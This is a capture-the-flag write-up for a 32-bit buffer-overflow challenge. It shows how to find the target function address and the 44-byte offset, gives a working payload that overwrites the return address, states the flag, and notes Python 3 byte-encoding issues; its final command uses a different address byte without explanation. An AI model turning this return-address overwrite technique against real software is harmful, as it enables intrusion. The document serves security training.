# Rop to the Top
binary - 130 points

## Challenge 
Rop, rop, rop

Rop to the top!

Slip and slide and ride that rhythm... 


Here's some [binary](rop_to_the_top32) and [source](rop_to_the_top.c). Navigate to `c` on the shell server to try your exploit out!

## Hint
Look up "Return Oriented Programming" (ROP) vulnerabilities and figure out how you might be able to change the return address.

## Solution

Return Address

	$ gdb ./rop_to_the_top32 
	(gdb) info add the_top
	Symbol "the_top" is at 0x80484db in a file compiled without debugging.

Offset

	$ strace ./rop_to_the_top32 $(pwn cyclic 100)
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x6161616c} ---
	+++ killed by SIGSEGV +++
	Segmentation fault

	$ pwn cyclic -l 0x6161616c
	44

Payload 

	$ ./rop_to_the_top32 $(python -c "print 'A'*44  + '\xdb\x84\x04\x08'")


## Flag

	actf{strut_your_stuff}


---

	
	team014544@shell:/problems/roptothetop$ export PYTHONIOENCODING=utf8
	team014544@shell:/problems/roptothetop$ python3 -c "print('aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa'  + '\xdb\x84\x04\x08', end='')" | xxd
	00000000: 6161 6161 6261 6161 6361 6161 6461 6161  aaaabaaacaaadaaa
	00000010: 6561 6161 6661 6161 6761 6161 6861 6161  eaaafaaagaaahaaa
	00000020: 6961 6161 6a61 6161 c39b c284 0408       iaaajaaa......

Seems like the \xdb is being parsed as 2 chars

export PYTHONIOENCODING=latin-1
(python3 -c "print('aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa' + '\xe1\x84\x04\x08', end='')" ) | xxd

